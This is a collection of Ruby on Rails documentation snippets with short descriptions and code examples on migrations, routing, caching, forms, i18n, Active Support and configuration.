      params.expect(product: [ :name ])
    end
end

----------------------------------------

TITLE: English Currency Symbol Configuration in YAML
DESCRIPTION: YAML configuration for the English locale defining a dollar sign as the currency symbol. Part of the improper translation example.

LANGUAGE: yaml
CODE:
# config/locales/en.yml
en:
  currency: "$"

----------------------------------------

TITLE: Registering additional file extensions for Rails annotations scanning
DESCRIPTION: Configure Rails to scan additional file types for annotations by registering extensions with their corresponding regex patterns to identify comments.

LANGUAGE: ruby
CODE:
config.annotations.register_extensions("scss", "sass") { |annotation| /\/\/\s*(#{annotation}):?\s*(.*)$/ }

----------------------------------------

TITLE: Interactive Ruby (IRB) Example of Custom Validation Messages
DESCRIPTION: Demonstrates the output of customized validation error messages in an IRB session. Shows how the YAML configuration affects both full_messages and messages hash output for validation errors.

LANGUAGE: ruby
CODE:
irb> person = Person.new.tap(&:valid?)

irb> person.errors.full_messages
=> [
  "Invalid Name (can't be blank)",
  "Please fill in your Age"
]

irb> person.errors.messages
=> {
  :name => ["can't be blank"],
  :age  => ["Please fill in your Age"]
}

----------------------------------------

TITLE: Running Migrations from a Specific Engine
DESCRIPTION: Command to run migrations only from a specific engine using the SCOPE parameter.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate SCOPE=blorgh

----------------------------------------

TITLE: Setting Rails Logger in Initializer
DESCRIPTION: Demonstrates how to set a custom logger in the Initializer section of a Rails application, allowing for STDOUT logging or third-party logger integration.

LANGUAGE: ruby
CODE:
Rails.logger = Logger.new(STDOUT)
Rails.logger = Log4r::Logger.new("Application Log")

----------------------------------------

TITLE: Adding a Git-Hosted Gem to a Rails Application
DESCRIPTION: Ruby code snippet showing how to include a development gem in a Rails application's Gemfile by referencing its Git repository URL, specifically for the 'yaffle' plugin.

LANGUAGE: ruby
CODE:
gem "yaffle", git: "https://github.com/rails/yaffle.git"

----------------------------------------

TITLE: Removing Manual EXIF Rotation for Vips in Active Storage
DESCRIPTION: Shows how to update image transformation code for Vips, which automatically handles EXIF rotation, removing the need for manual rotation parameters.

LANGUAGE: ruby
CODE:
- variant(format: :jpg, rotate: rotation_value)
+ variant(format: :jpg)

----------------------------------------

TITLE: Getting Model Element Name for Partials in Rails
DESCRIPTION: Shows the model_name.element method which returns the singular snake_cased name without namespace. Useful for partial/form naming in views.

LANGUAGE: irb
CODE:
irb> Person.model_name.element
=> "person"

----------------------------------------

TITLE: Rendering a Collection with Layout in ERB
DESCRIPTION: Example of rendering a collection of articles with a special layout applied to each item in the collection. The current item and counter are available in both partial and layout.

LANGUAGE: erb
CODE:
<%= render partial: "article", collection: @articles, layout: "special_layout" %>

----------------------------------------

TITLE: String Truncation with Separator in Ruby
DESCRIPTION: Demonstrates truncating strings at word boundaries using the :separator option to avoid breaking words.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate(18)
# => "Oh dear! Oh dea..."
"Oh dear! Oh dear! I shall be late!".truncate(18, separator: " ")
# => "Oh dear! Oh..."

----------------------------------------

TITLE: Controller Action for Custom Route in Rails
DESCRIPTION: Example of a controller action for a custom route. In Rails 4, form submissions to this action will attempt to use PATCH instead of PUT by default.

LANGUAGE: ruby
CODE:
class UsersController < ApplicationController
  def update_name
    # Change needed; form_for will try to use a non-existent PATCH route.
  end
end

----------------------------------------

TITLE: Deleting an Author and Their Books without Associations in Ruby on Rails
DESCRIPTION: Code example demonstrating how to delete an author and all their books without associations. It requires manually fetching, iterating through, and deleting each book before deleting the author.

LANGUAGE: ruby
CODE:
@books = Book.where(author_id: @author.id)
@books.each do |book|
  book.destroy
end
@author.destroy

----------------------------------------

TITLE: Setting Layout at Controller Level in Rails
DESCRIPTION: Example of using the layout declaration to specify a custom layout for all actions in a controller class. This overrides the default layout convention.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  layout "inventory"
  #...
end

----------------------------------------

TITLE: Using references with includes for SQL Fragment Conditions
DESCRIPTION: Shows how to use the references method when adding string condition fragments to an includes query. This is necessary to force the joined tables when using SQL fragments instead of hash conditions.

LANGUAGE: ruby
CODE:
Author.includes(:books).where("books.out_of_print = true").references(:books)

----------------------------------------

TITLE: Skipping Solid Cache in New Rails Application
DESCRIPTION: Command to create a new Rails application without Solid Cache enabled. This flag skips both Solid Cache and Solid Queue installation during app creation.

LANGUAGE: bash
CODE:
rails new app_name --skip-solid

----------------------------------------

TITLE: Adding Foreign Key with Custom Column and Primary Key in Rails Migrations
DESCRIPTION: Shows how to add a foreign key constraint with custom column and primary key specifications. This creates a constraint where articles.reviewer must reference a valid email in the authors table.

LANGUAGE: ruby
CODE:
add_foreign_key :articles, :authors, column: :reviewer, primary_key: :email

----------------------------------------

TITLE: Proper Naming Conventions for Rails Components
DESCRIPTION: Shows the correct way to refer to Rails components using their proper names with appropriate spacing.

LANGUAGE: ruby
CODE:
# GOOD
# Active Record classes can be created by inheriting from
# ActiveRecord::Base.

----------------------------------------

TITLE: Starting the Jobs Queue Processor in Rails
DESCRIPTION: Command to start processing jobs from the queue in a Rails application that's using Solid Queue as the Active Job adapter.

LANGUAGE: bash
CODE:
bin/jobs start

----------------------------------------

TITLE: Configuring Cache-Control Headers in Rails
DESCRIPTION: Sets Cache-Control headers for public files served by Rails. This configuration tells browsers and CDNs to cache assets for up to one year, reducing server load and improving performance.

LANGUAGE: ruby
CODE:
config.public_file_server.headers = {
  "Cache-Control" => "public, max-age=31536000"
}

----------------------------------------

TITLE: Running a Single Active Record Test with a Specific Adapter
DESCRIPTION: Shows how to run a specific Active Record test file with a specific database adapter. This example uses the MySQL2 adapter for testing has_many associations.

LANGUAGE: bash
CODE:
$ ARCONN=mysql2 bundle exec ruby -Itest test/cases/associations/has_many_associations_test.rb

----------------------------------------

TITLE: Formatting Ranges with to_fs in Rails
DESCRIPTION: The to_fs method is an alternative to to_s for ranges that accepts an optional format argument. The :db format generates a BETWEEN SQL clause, which is used by Active Record for range values in conditions.

LANGUAGE: ruby
CODE:
(Date.today..Date.tomorrow).to_fs
# => "2009-10-25..2009-10-26"

(Date.today..Date.tomorrow).to_fs(:db)
# => "BETWEEN '2009-10-25' AND '2009-10-26'"

----------------------------------------

TITLE: Using Monday and Sunday Methods for Week Navigation
DESCRIPTION: Demonstrates the monday and sunday methods which return dates for the previous Monday and next Sunday, including edge cases when the date is already a Monday or Sunday.

LANGUAGE: ruby
CODE:
d = Date.new(2010, 5, 8)     # => Sat, 08 May 2010
d.monday                     # => Mon, 03 May 2010
d.sunday                     # => Sun, 09 May 2010

d = Date.new(2012, 9, 10)    # => Mon, 10 Sep 2012
d.monday                     # => Mon, 10 Sep 2012

d = Date.new(2012, 9, 16)    # => Sun, 16 Sep 2012
d.sunday                     # => Sun, 16 Sep 2012

----------------------------------------

TITLE: Configuring Associations with Composite Foreign Keys
DESCRIPTION: Example showing how to use the query_constraints option with belongs_to associations to properly reference models with composite primary keys.

LANGUAGE: ruby
CODE:
class TravelRouteReview < ActiveRecord::Base
  belongs_to :travel_route, query_constraints: [:travel_route_origin, :travel_route_destination]
end

----------------------------------------

TITLE: Using inspect Method in Rails Views
DESCRIPTION: Demonstrates using the inspect method to display array or hash values as strings in a Rails view, which is particularly useful for debugging collection objects.

LANGUAGE: erb
CODE:
<%= [1, 2, 3, 4, 5].inspect %>
<p>
  <b>Title:</b>
  <%= @article.title %>
</p>

----------------------------------------

TITLE: Creating Select Boxes with Option Groups in Rails ERB
DESCRIPTION: This snippet demonstrates how to create a select box with grouped options using the Rails form select helper. It shows how to organize options into logical groups like 'Europe' and 'North America'.

LANGUAGE: erb
CODE:
<%= form.select :city,
      {
        "Europe" => [ ["Berlin", "BE"], ["Madrid", "MD"] ],
        "North America" => [ ["Chicago", "CHI"] ],
      },
      selected: "CHI" %>

----------------------------------------

TITLE: Combining Pattern Matching with with_defaults in Rails Partials
DESCRIPTION: Shows how to combine Ruby 3.1's pattern matching with Hash#with_defaults to enable compact default value assignments for partial locals.

LANGUAGE: html+erb
CODE:
<%# app/views/products/_product.html.erb %>

<% local_assigns.with_defaults(related_products: []) => { product:, related_products: } %>

<%= tag.div id: dom_id(product) do %>
  <h1><%= product.name %></h1>

  <% related_products.each do |related_product| %>
    <%# ... %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Default Solid Queue Configuration in YAML
DESCRIPTION: Default configuration for Solid Queue including dispatcher and worker settings that control how jobs are processed and handled by the queuing system.

LANGUAGE: yaml
CODE:
default: &default
  dispatchers:
    - polling_interval: 1
      batch_size: 500
  workers:
    - queues: "*"
      threads: 3
      processes: <%= ENV.fetch("JOB_CONCURRENCY", 1) %>
      polling_interval: 0.1

----------------------------------------

TITLE: Using Custom JSON Coders with ActiveRecord::Store
DESCRIPTION: Demonstrates how to set custom coders for ActiveRecord::Store in Rails 4.0. This feature allows developers to specify how store data is serialized and deserialized, with JSON being used in this example.

LANGUAGE: ruby
CODE:
store :settings, accessors: [ :color, :homepage ], coder: JSON

----------------------------------------

TITLE: Using months_ago and months_since with Date objects in Ruby on Rails
DESCRIPTION: Examples of using the months_ago and months_since methods to navigate backward and forward in time by months. When the target day doesn't exist in the resulting month, the last day of the month is returned.

LANGUAGE: ruby
CODE:
Date.new(2010, 4, 30).months_ago(2)   # => Sun, 28 Feb 2010
Date.new(2010, 4, 30).months_since(2) # => Wed, 30 Jun 2010

LANGUAGE: ruby
CODE:
Date.new(2010, 4, 30).months_ago(2)    # => Sun, 28 Feb 2010
Date.new(2009, 12, 31).months_since(2) # => Sun, 28 Feb 2010

----------------------------------------

TITLE: Demonstrating String#underscore Method in Ruby on Rails
DESCRIPTION: Examples showing how underscore converts CamelCase to underscore_case, the inverse of camelize, useful for generating paths from class names.

LANGUAGE: ruby
CODE:
"Product".underscore   # => "product"
"AdminUser".underscore # => "admin_user"

----------------------------------------

TITLE: Generated HTML Output from Indexed Fields
DESCRIPTION: Shows the HTML output generated by the fields_for helper with index option. The form includes inputs for a person's name and addresses with IDs incorporated into the input names.

LANGUAGE: html
CODE:
<form accept-charset="UTF-8" action="/people/1" method="post">
  <input name="_method" type="hidden" value="patch" />
  <input id="person_name" name="person[name]" type="text" />
  <input id="person_address_23_city" name="person[address][23][city]" type="text" />
  <input id="person_address_45_city" name="person[address][45][city]" type="text" />
</form>

----------------------------------------

TITLE: Encrypting Action Text Content
DESCRIPTION: Example showing how to encrypt Action Text rich text content by adding the encrypted option to the has_rich_text declaration.

LANGUAGE: ruby
CODE:
class Message < ApplicationRecord
  has_rich_text :content, encrypted: true
end

----------------------------------------

TITLE: Configuring Asset Hosts in Rails
DESCRIPTION: Example of configuring a dedicated asset host server in a Rails application. This allows assets to be served from a different domain than the application itself.

LANGUAGE: ruby
CODE:
config.asset_host = "assets.example.com"

----------------------------------------

TITLE: Creating and Querying a Device Model with IPAddr in Rails
DESCRIPTION: Demonstrates how to create a Device model with IP address, network, and MAC address fields and query the resulting values. The IP and network fields are automatically cast to IPAddr objects.

LANGUAGE: irb
CODE:
irb> macbook = Device.create(ip: "192.168.1.12", network: "192.168.2.0/24", address: "32:01:16:6d:05:ef")

irb> macbook.ip
=> #<IPAddr: IPv4:192.168.1.12/255.255.255.255>

irb> macbook.network
=> #<IPAddr: IPv4:192.168.2.0/255.255.255.0>

irb> macbook.address
=> "32:01:16:6d:05:ef"

----------------------------------------

TITLE: Using assert_error_reported for Testing Error Reporting in Rails
DESCRIPTION: Tests that an error of a specific class has been reported in the block.

LANGUAGE: ruby
CODE:
assert_error_reported(class) { block }

----------------------------------------

TITLE: Rendering Partial from Different Directory
DESCRIPTION: Example showing how to render a partial from a different directory by specifying the path.

LANGUAGE: html+erb
CODE:
<%= render "application/product" %>

----------------------------------------

TITLE: Using escape_javascript in Rails Views
DESCRIPTION: Example showing how to use escape_javascript to safely include dynamic content in JavaScript, escaping quotes and other characters that could break JavaScript syntax.

LANGUAGE: ruby
CODE:
<script>
  var greeting = "<%= escape_javascript render('users/greeting') %>";
  alert(`Hello, ${greeting}`);
</script>

----------------------------------------

TITLE: Horizontal Sharding Database Configuration in YAML
DESCRIPTION: Database configuration example for horizontal sharding with primary databases, replicas, and multiple shards, each with their own connection configurations.

LANGUAGE: yaml
CODE:
production:
  primary:
    database: my_primary_database
    adapter: mysql2
  primary_replica:
    database: my_primary_database
    adapter: mysql2
    replica: true
  primary_shard_one:
    database: my_primary_shard_one
    adapter: mysql2
    migrations_paths: db/migrate_shards
  primary_shard_one_replica:
    database: my_primary_shard_one
    adapter: mysql2
    replica: true
  primary_shard_two:
    database: my_primary_shard_two
    adapter: mysql2
    migrations_paths: db/migrate_shards
  primary_shard_two_replica:
    database: my_primary_shard_two
    adapter: mysql2
    replica: true

----------------------------------------

TITLE: Registering Mail Interceptors in Ruby
DESCRIPTION: Shows how to register interceptor classes that will be called before mail is sent through Action Mailer, allowing for modifications to outgoing mail.

LANGUAGE: ruby
CODE:
config.action_mailer.interceptors = ["MailInterceptor"]

----------------------------------------

TITLE: Extending Autoload Paths Configuration
DESCRIPTION: Shows how to extend the default autoload paths by adding a custom directory to config.autoload_paths in the application configuration.

LANGUAGE: ruby
CODE:
module MyApplication
  class Application < Rails::Application
    config.autoload_paths << "#{root}/extras"
  end
end

----------------------------------------

TITLE: Demonstrating I18n Missing Translations Behavior in Rails 7.1
DESCRIPTION: Shows how Rails 7.1 handles missing translations in different contexts when config.i18n.raise_on_missing_translations is set to false.

LANGUAGE: ruby
CODE:
# with config.i18n.raise_on_missing_translations = false

# in a view or controller:
t("missing.key") # didn't raise in 7.0, doesn't raise in 7.1
I18n.t("missing.key") # didn't raise in 7.0, doesn't raise in 7.1

# anywhere:
I18n.t("missing.key") # didn't raise in 7.0, doesn't raise in 7.1

----------------------------------------

TITLE: Excluding Routes with :except Option in Rails
DESCRIPTION: Shows how to exclude specific routes from being created using the :except option. This creates all standard RESTful routes except those specified in the option.

LANGUAGE: ruby
CODE:
resources :photos, except: :destroy

----------------------------------------

TITLE: Adding and Removing Foreign Keys in Rails 4.2 Migrations
DESCRIPTION: Demonstrates the new migration DSL for adding and removing foreign keys to database tables. Works with MySQL and PostgreSQL adapters.

LANGUAGE: ruby
CODE:
# add a foreign key to `articles.author_id` referencing `authors.id`
add_foreign_key :articles, :authors

# add a foreign key to `articles.author_id` referencing `users.lng_id`
add_foreign_key :articles, :users, column: :author_id, primary_key: "lng_id"

# remove the foreign key on `accounts.branch_id`
remove_foreign_key :accounts, :branches

# remove the foreign key on `accounts.owner_id`
remove_foreign_key :accounts, column: :owner_id

----------------------------------------

TITLE: Getting Previous Change Details with _previous_change in Rails
DESCRIPTION: Demonstrates the [attr_name]_previous_change method which returns an array with [original_value, new_value] for changes made before the model was saved.

LANGUAGE: irb
CODE:
irb> person.first_name_previous_change
=> [nil, "John Doe"]

----------------------------------------

TITLE: Using PostgreSQL Explain with Buffer Analysis in Rails
DESCRIPTION: Demonstrates using PostgreSQL-specific EXPLAIN options with ActiveRecord, including analyze and buffers flags to get detailed query execution information.

LANGUAGE: ruby
CODE:
Company.where(id: owning_companies_ids).explain(:analyze, :buffers)
#=> EXPLAIN (ANALYZE, BUFFERS) SELECT "companies".* FROM "companies"
# ...
# Seq Scan on companies  (cost=0.00..2.21 rows=3 width=64)
# ...

----------------------------------------

TITLE: Skipping Components when Creating a Rails Application
DESCRIPTION: Shows how to create a Rails application while skipping certain components using the --skip options. In this example, Active Storage is skipped, which also skips dependent components like Action Mailbox and Action Text.

LANGUAGE: bash
CODE:
$ rails new sas --skip-active-storage
Based on the specified options, the following options will also be activated:

  --skip-action-mailbox [due to --skip-active-storage]
  --skip-action-text [due to --skip-active-storage]

      create
      create  README.md
      ...

----------------------------------------

TITLE: Updating Session Store Configuration
DESCRIPTION: Changes the session store key to a new value to avoid conflicts when upgrading to Rails 3.1.12. This requires either updating the session key or clearing all existing sessions.

LANGUAGE: ruby
CODE:
# in config/initializers/session_store.rb
AppName::Application.config.session_store :cookie_store, key: "SOMETHINGNEW"

----------------------------------------

TITLE: Specifying Cache Shards in cache.yml
DESCRIPTION: Configuration for specifying which database shards to use for Solid Cache. This complements the database.yml configuration by listing the shards that should be used for caching.

LANGUAGE: yaml
CODE:
# config/cache.yml
production:
  databases: [cache_shard1, cache_shard2, cache_shard3]

----------------------------------------

TITLE: Removing Foreign Keys in Rails Migrations
DESCRIPTION: Demonstrates two ways to remove foreign key constraints. The first lets Active Record determine the column name, while the second specifies which column's foreign key to remove.

LANGUAGE: ruby
CODE:
# let Active Record figure out the column name
remove_foreign_key :accounts, :branches

# remove foreign key for a specific column
remove_foreign_key :accounts, column: :owner_id

----------------------------------------

TITLE: Rendering Layout Example Payload in Action View
DESCRIPTION: Example of the payload data available during a render_layout.action_view event. This shows the identifier path to the layout template.

LANGUAGE: ruby
CODE:
{
  identifier: "/Users/adam/projects/notifications/app/views/layouts/application.html.erb"
}

----------------------------------------

TITLE: Fragment Caching in Rails Views
DESCRIPTION: The cache helper enables fragment caching in views. It can cache specific view portions based on unique keys or model instances to improve performance and reduce rendering time.

LANGUAGE: erb
CODE:
<% cache do %>
  <%= render "application/footer" %>
<% end %>

LANGUAGE: erb
CODE:
<% @articles.each do |article| %>
  <% cache article do %>
    <%= render article %>
  <% end %>
<% end %>

LANGUAGE: irb
CODE:
views/articles/index:bea67108094918eeba32cd4a6f786301/articles/1

----------------------------------------

TITLE: Configuring Action Mailbox Logger in Ruby
DESCRIPTION: Shows how to configure a custom logger for Action Mailbox by setting it to write logs to standard output instead of the default Rails logger.

LANGUAGE: ruby
CODE:
config.action_mailbox.logger = ActiveSupport::Logger.new(STDOUT)

----------------------------------------

TITLE: Permitting Entire Parameter Hash in Rails
DESCRIPTION: This snippet shows how to permit an entire hash of parameters without checking for specific keys. This approach requires caution as it allows any attribute to be mass-assigned.

LANGUAGE: ruby
CODE:
params.expect(log_entry: {})

----------------------------------------

TITLE: Getting Plural Model Name in Rails
DESCRIPTION: Demonstrates getting the plural version of a class name using model_name.plural. Returns the pluralized snake_cased form of the class name.

LANGUAGE: irb
CODE:
irb> Person.model_name.plural
=> "people"

----------------------------------------

TITLE: Using Disabled Option in Form Select Helpers
DESCRIPTION: This Ruby code shows how to use the :disabled option with select and options_for_select form helpers to disable specific options in dropdown menus. A single value or array of values can be specified.

LANGUAGE: ruby
CODE:
select(:post, :category, Post::CATEGORIES, :disabled => 'private')

----------------------------------------

TITLE: Using try with Block Syntax in Ruby on Rails
DESCRIPTION: Example of using try with a block that only executes if the object is not nil.

LANGUAGE: ruby
CODE:
@person.try { |p| "#{p.first_name} #{p.last_name}" }

----------------------------------------

TITLE: Specifying Rejection Criteria for Nested Attributes in Ruby on Rails
DESCRIPTION: This snippet shows how to use the :reject_if option with accepts_nested_attributes_for to specify requirements for new records added via nested attributes, rejecting records when certain conditions are met.

LANGUAGE: ruby
CODE:
accepts_nested_attributes_for :author,
  :reject_if => proc { |attributes| attributes['name'].blank? }

----------------------------------------

TITLE: Building Empty Associated Objects for Forms in Rails
DESCRIPTION: Shows a controller method for initializing a new Person with empty Address objects. This ensures form fields for addresses are displayed even when a person doesn't have any addresses yet.

LANGUAGE: ruby
CODE:
def new
  @person = Person.new
  2.times { @person.addresses.build }
end

----------------------------------------

TITLE: Defining Translations for ActiveRecord Models and Attributes
DESCRIPTION: Shows how to define translations for model names and attribute names in YAML configuration files for use with ActiveRecord models.

LANGUAGE: yaml
CODE:
en:
  activerecord:
    models:
      user: Customer
    attributes:
      user:
        login: "Handle"
      # will translate User attribute "login" as "Handle"

----------------------------------------

TITLE: Example of Transaction with Potential Issues
DESCRIPTION: This code shows a transaction where picture_file_1 is destroyed and picture_file_2 is saved. If the save operation fails and rolls back the transaction, the file would already have been deleted.

LANGUAGE: ruby
CODE:
PictureFile.transaction do
  picture_file_1.destroy
  picture_file_2.save!
end

----------------------------------------

TITLE: Grouping Conditional Validations with with_options in Rails
DESCRIPTION: Demonstrates how to group multiple validations with a single condition using with_options. This helps avoid repeating the same condition across multiple validations.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  with_options if: :is_admin? do |admin|
    admin.validates :password, length: { minimum: 10 }
    admin.validates :email, presence: true
  end
end

----------------------------------------

TITLE: Using Qualified Names in Class Definitions with Zeitwerk
DESCRIPTION: Example of proper usage of qualified names in class and module definitions when using Zeitwerk autoloading mode, showing different approaches to handle nested namespaces.

LANGUAGE: ruby
CODE:
# Autoloading in this class' body matches Ruby semantics now.
class Admin::UsersController < ApplicationController
  # ...
end

LANGUAGE: ruby
CODE:
class Foo::Bar
  Foo::Wadus
end

LANGUAGE: ruby
CODE:
module Foo
  class Bar
    Wadus
  end
end

----------------------------------------

TITLE: Simple Ordering of Query Results in Rails
DESCRIPTION: Shows basic ordering of query results by a single field in ascending order, the default sort direction.

LANGUAGE: ruby
CODE:
Book.order(:created_at)
# OR
Book.order("created_at")

----------------------------------------

TITLE: HTML Output from form_with with ActiveModel Object
DESCRIPTION: This snippet shows the HTML output generated when using form_with with an EmailContact object that includes ActiveModel::API. It demonstrates how the model name is used to create form field names.

LANGUAGE: html
CODE:
<form action="/email_contacts" method="post">
  <input type="text" name="email_contact[name]" id="email_contact_name">
</form>

----------------------------------------

TITLE: Cache Delete Matched Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_delete_matched.active_support event. This shows the cache key pattern and store class name.

LANGUAGE: ruby
CODE:
{
  key: "posts/*",
  store: "ActiveSupport::Cache::RedisCacheStore"
}

----------------------------------------

TITLE: Accessing Merged Configuration Values
DESCRIPTION: Shows how to access configuration values that combine shared and environment-specific settings from a YAML file.

LANGUAGE: ruby
CODE:
# development environment
Rails.application.config_for(:example)[:foo][:bar] #=> { baz: 1, qux: 2 }

----------------------------------------

TITLE: Enabling Reloading in Test Environment for Spring
DESCRIPTION: Configuration required in the test environment to work with Spring, which needs reloading to be enabled. Sets cache_classes to false to allow code changes to be detected and reloaded.

LANGUAGE: ruby
CODE:
# config/environments/test.rb

config.cache_classes = false

----------------------------------------

TITLE: Running Rails Tests on Line Ranges
DESCRIPTION: Demonstrates running tests within a range of lines by providing a line range to the test command. Useful for running a subset of related tests.

LANGUAGE: bash
CODE:
$ bin/rails test test/models/article_test.rb:6-20 # runs tests from line 6 to 20

----------------------------------------

TITLE: Mailer Process Example Payload in Action Mailer
DESCRIPTION: Example of the payload data available during a process.action_mailer event. This includes the mailer class, action name, and arguments.

LANGUAGE: ruby
CODE:
{
  mailer: "Notification",
  action: "welcome_email",
  args: []
}

----------------------------------------

TITLE: Using assert_difference for Testing Numeric Changes in Ruby
DESCRIPTION: Tests that numeric difference occurs between the return value of an expression before and after the block execution.

LANGUAGE: ruby
CODE:
assert_difference(expressions, difference = 1, message = nil) { block }

----------------------------------------

TITLE: Disabling PostgreSQL Features for Connection Poolers in Rails
DESCRIPTION: This configuration shows how to disable prepared statements and advisory locks for PostgreSQL when using external connection poolers like PgBouncer.

LANGUAGE: yaml
CODE:
production:
  adapter: postgresql
  prepared_statements: false
  advisory_locks: false

----------------------------------------

TITLE: Configuring Database CLI Tools in Rails
DESCRIPTION: This snippet demonstrates how to configure custom database CLI tools for different database systems when using bin/rails dbconsole, with fallback options specified as an array.

LANGUAGE: ruby
CODE:
# config/application.rb

config.active_record.database_cli = { postgresql: "pgcli", mysql: %w[ mycli mysql ] }

----------------------------------------

TITLE: Testing Strict Validations in Rails Console
DESCRIPTION: Shows how strict validations behave in Rails console by raising an exception immediately when validation fails. This provides immediate feedback for critical validation errors.

LANGUAGE: ruby
CODE:
irb> Person.new.valid?
=> ActiveModel::StrictValidationFailed: Name can't be blank

----------------------------------------

TITLE: Instrumenting Custom Events in Ruby using ActiveSupport::Notifications
DESCRIPTION: Shows how to create a custom event with ActiveSupport::Notifications by passing a name, payload, and a block. The notification is sent after the block returns, with ActiveSupport generating start and end times automatically.

LANGUAGE: ruby
CODE:
ActiveSupport::Notifications.instrument "my.custom.event", this: :data do
  # do your custom stuff here
end

----------------------------------------

TITLE: Prefixing Route Helpers with :as Option in a Scope Block
DESCRIPTION: Shows how to prevent name collisions between routes by prefixing named route helpers with the :as option in a scope block. This is useful when you have routes with the same name in different scopes.

LANGUAGE: ruby
CODE:
scope "admin" do
  resources :photos, as: "admin_photos"
end

resources :photos

----------------------------------------

TITLE: Configuring PostgreSQL Structure Dump Flags in Rails
DESCRIPTION: Shows how to configure PostgreSQL's pg_dump behavior by setting structure_dump_flags to exclude comments from the database structure dump.

LANGUAGE: ruby
CODE:
ActiveRecord::Tasks::DatabaseTasks.structure_dump_flags = ["--no-comments"]

----------------------------------------

TITLE: Using javascript_tag Helper in Rails
DESCRIPTION: Examples of using javascript_tag to generate script tags with CDATA sections, supporting both content as an argument and as a block for cleaner template syntax.

LANGUAGE: ruby
CODE:
javascript_tag("alert('All is good')", type: "application/javascript")

----------------------------------------

TITLE: Adding Constraints to Resource IDs in Rails Routes
DESCRIPTION: Demonstrates how to add constraints to the :id parameter in resourceful routes using regular expressions. This limits which values will be recognized as valid IDs for the resource.

LANGUAGE: ruby
CODE:
resources :photos, constraints: { id: /[A-Z][A-Z][0-9]+/ }

----------------------------------------

TITLE: Creating Read-Only Associations with readonly in Rails
DESCRIPTION: Shows how to make associated objects read-only when retrieved via an association using the readonly method in the association scope. This prevents modifications through the association.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  belongs_to :author, -> { readonly }
end

----------------------------------------

TITLE: Creating an ERB View Template
DESCRIPTION: Shows the implementation of an ERB view that displays the message set in the controller. This demonstrates how controllers and views work together in Rails.

LANGUAGE: erb
CODE:
<h1>A Greeting for You!</h1>
<p><%= @message %></p>

----------------------------------------

TITLE: Asking Yes/No Questions with yes? and no? Methods
DESCRIPTION: Example of asking yes/no questions and conditionally executing code based on the user's response using the yes? and no? methods.

LANGUAGE: ruby
CODE:
rails_command("db:migrate") if yes?("Run database migrations?")
# no?(question) acts just the opposite.

----------------------------------------

TITLE: Configuring FileStore Cache in Rails
DESCRIPTION: Sets up a file system-based cache store by specifying the directory path where cache files will be stored. This implementation allows multiple server processes on the same host to share a cache.

LANGUAGE: ruby
CODE:
config.cache_store = :file_store, "/path/to/cache/directory"

----------------------------------------

TITLE: Disabling Transaction for Special DDL Operations in Ruby on Rails
DESCRIPTION: Demonstrates how to disable automatic DDL transactions for migrations containing operations that can't be executed within a transaction, such as adding values to an enum type in PostgreSQL.

LANGUAGE: ruby
CODE:
class ChangeEnum < ActiveRecord::Migration[8.1]
  disable_ddl_transaction!

  def up
    execute "ALTER TYPE model_size ADD VALUE 'new_value'"
  end
end

----------------------------------------

TITLE: Loading All Core Extensions in Ruby on Rails
DESCRIPTION: How to load all of Active Support's core extensions at once.

LANGUAGE: ruby
CODE:
require "active_support"
require "active_support/core_ext"

----------------------------------------

TITLE: Running Database Migrations in Rails
DESCRIPTION: Command to update the database schema after generating a new resource. This applies pending migrations to create necessary tables.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Message Serializer Fallback Event Structure in Active Support
DESCRIPTION: Shows the structure of the payload for the message_serializer_fallback.active_support event. Includes the primary and fallback serializers, serialized string, and deserialized value.

LANGUAGE: ruby
CODE:
{
  serializer: :json_allow_marshal,
  fallback: :marshal,
  serialized: "\x04\b{\x06I\"\nHello\x06:\x06ETI\"\nWorld\x06;\x00T",
  deserialized: { "Hello" => "World" },
}

----------------------------------------

TITLE: Adding Duration to DateTime in Ruby
DESCRIPTION: Duration objects can be added to and subtracted from DateTime objects to perform date and time calculations.

LANGUAGE: ruby
CODE:
now = DateTime.current
# => Mon, 09 Aug 2010 23:15:17 +0000
now + 1.year
# => Tue, 09 Aug 2011 23:15:17 +0000
now - 1.week
# => Mon, 02 Aug 2010 23:15:17 +0000

----------------------------------------

TITLE: Loading Environment-Specific Configuration in Rails
DESCRIPTION: Shows how to use Rails::Application.config_for to load configuration for the current environment from a YAML file. This feature allows for environment-specific configuration to be easily loaded and used in the application.

LANGUAGE: yaml
CODE:
# config/exception_notification.yml
production:
  url: http://127.0.0.1:8080
  namespace: my_app_production
development:
  url: http://localhost:3001
  namespace: my_app_development

LANGUAGE: ruby
CODE:
# config/environments/production.rb
Rails.application.configure do
  config.middleware.use ExceptionNotifier, config_for(:exception_notification)
end

----------------------------------------

TITLE: Including Yaffle Module in ApplicationRecord
DESCRIPTION: Configuration to include the ActsAsYaffle module in ApplicationRecord. This makes the acts_as_yaffle method available to all models in the application.

LANGUAGE: ruby
CODE:
# test/dummy/app/models/application_record.rb

class ApplicationRecord < ActiveRecord::Base
  include Yaffle::ActsAsYaffle

  self.abstract_class = true
end

----------------------------------------

TITLE: Creating a New Rails 3.0 Application
DESCRIPTION: Shows the command to generate a new Rails 3.0 application using the rails new generator. This creates the application directory structure with all necessary configuration files.

LANGUAGE: bash
CODE:
# You should have the 'rails' RubyGem installed
$ rails new myapp
$ cd myapp

----------------------------------------

TITLE: Configuring Asset Host for Images in Action Mailer
DESCRIPTION: Sets the asset host configuration for Action Mailer to enable the use of image_tag helper in email templates. This is necessary because mailer instances don't have request context.

LANGUAGE: ruby
CODE:
config.action_mailer.asset_host = "http://example.com"

----------------------------------------

TITLE: Using ArrayInquirer for array inclusion checking
DESCRIPTION: Provides a more expressive way to check for the inclusion of elements in an array, similar to StringInquirer.

LANGUAGE: ruby
CODE:
ActiveSupport::ArrayInquirer
Array#inquiry

----------------------------------------

TITLE: Applying a template to an existing Rails application
DESCRIPTION: Command to apply a template to an existing Rails application using the app:template rake task. This allows for configuration of applications that have already been created.

LANGUAGE: bash
CODE:
$ bin/rails app:template LOCATION=path/to/template.rb

----------------------------------------

TITLE: Using ActionView::TestCase.register_parser for HTML and JSON Testing
DESCRIPTION: Example demonstrating how to use the built-in HTML and JSON parsers in view tests. This enables pattern matching assertions on rendered HTML nodes and JSON structures.

